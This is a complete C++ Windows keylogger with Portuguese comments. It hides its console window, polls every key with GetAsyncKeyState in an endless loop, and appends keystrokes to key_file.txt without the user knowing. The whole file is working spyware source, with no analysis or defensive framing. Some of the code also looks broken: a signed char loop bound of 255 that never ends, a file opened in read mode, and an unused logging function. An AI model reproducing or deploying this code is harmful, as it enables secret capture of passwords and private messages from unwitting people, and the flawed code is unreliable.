#include <iostream>
#include <fstream>
#include <Windows.h>

using namespace std;

// Função para registrar a tecla pressionada
void logKeyStroke(char key) {
    ofstream logfile;
    logfile.open("log.txt", ios::app); // Abre o arquivo de log em modo de escrita, acrescentando ao final do arquivo
    if (logfile.is_open()) {
        logfile << key; // Escreve a tecla no arquivo de log
        logfile.close(); // Fecha o arquivo
    }
}

// Função para esconder a janela do console
void hideConsoleWindow() {
    HWND stealth;
    AllocConsole(); // Aloca um console para a aplicação
    stealth = FindWindowA("ConsoleWindowClass", NULL); // Encontra a janela do console
    ShowWindow(stealth, 0); // Esconde a janela do console
}

int main() {
    hideConsoleWindow(); // Esconde a janela do console

    char key;

    while (true) {
        Sleep(10); // Aguarda 10ms para evitar consumo excessivo de CPU

        // Verifica todas as teclas de 8 (BACKSPACE) a 255 (tecla não utilizada)
        for (key = 8; key <= 255; key++) {
            // Verifica se a tecla está sendo pressionada
            if (GetAsyncKeyState(key) == -32767) {
                ofstream file;
                file.open("key_file.txt", ios::app | ios::in | ios::out); // Abre o arquivo de log em modo de escrita, leitura e atualização
                if (file) {
                    switch(key) {
                        case VK_SHIFT:
                            file << "SHIFT";
                            break;
                        case VK_ESCAPE:
                            file << "ESCAPE";
                            break;
                        case VK_RETURN:
                            file << "ENTER";
                            break;
                        case VK_CONTROL:
                            file << "CONTROL";
                            break;
                        case VK_MENU:
                            file << "ALT";
                            break;
                        case VK_DELETE:
                            file << "DELETE";
                            break;
                        case VK_TAB:
                            file << "TAB";
                            break;
                        case VK_BACK:
                            file << "BACKSPACE";
                            break;
                        default:
                            file << key;
                            break;
                    }
                }
                file.close(); // Fecha o arquivo
            }
        }
    }

    return 0;
}